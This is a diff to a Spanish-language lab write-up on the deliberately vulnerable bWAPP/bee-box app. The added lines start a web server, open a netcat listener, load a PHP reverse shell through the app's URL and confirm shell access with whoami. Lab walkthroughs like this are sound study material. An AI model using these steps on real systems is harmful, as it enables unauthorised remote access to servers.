@@ -81,6 +81,25 @@ cp php-reverse-shell.php /var/www/html
 ```
 Una vez configurado nuestro fichero a usar, podremos proceder a colocar nuestro enlace, previamente iniciando un servicio de apache2 y poniendo nuestra máquina a la escucha y cargaremos nuestra webshell desde el mismo link de la aplicación web.
 
+```bash
+service apache2 start
+```
+
+```bash
+nc -lvnp 44044
+```
+
+Probaremos con cargar dentro del URL de la aplicación web nuestra `webshell` 
+
+`http://nuestraIPdelamáquina/php-reverse-shell.php`
+
+Y cuando vayamos hacia nuestra `shell` podremos observar que hemos conectado una remote shell hacia nuestra máquina y estamos dentro de la máquina `beebox`.
+
+```bash
+whoami
+```
+Podemos observar que estamos en el directorio /home/root/ de `beebox`
+
 <img src="assets/HTB/bWAPP/webshell.png">
 
 
